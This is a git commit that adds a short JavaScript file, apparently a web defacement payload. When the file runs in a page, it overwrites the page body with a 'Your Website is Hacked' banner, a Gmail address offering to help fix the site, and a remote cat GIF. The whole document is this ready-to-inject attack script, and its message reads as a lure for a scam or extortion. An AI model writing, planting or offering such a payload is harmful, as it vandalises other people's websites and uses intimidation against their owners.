cbcb6ceb662e78b158f9828d89902be081b0fc26
White-Hat-Human <97013655+White-Hat-Human@users.noreply.github.com>
2022-01-03 08:32:46 +0200

    Add files via upload

---
+++ filee.js
@@ -0,0 +1,2 @@
+document.getElementsByTagName('body')[0].innerHTML ='<h1>Your Website is Hacked :)</h1><p style="font-size:24px;color:red;">But Don\'t Worry!, I can help you fix this, email me at <a style="text-decoration:none;" href = "mailto:white.hat.human.11@gmail.com">white.hat.human.11@gmail.com</p><br><br><br><br><br><img src="https://c.tenor.com/jFn8sS1Et-0AAAAS/cat.gif" width="500px" height="300px">';
+document.getElementsByTagName('body')[0].style = 'text-align:center';
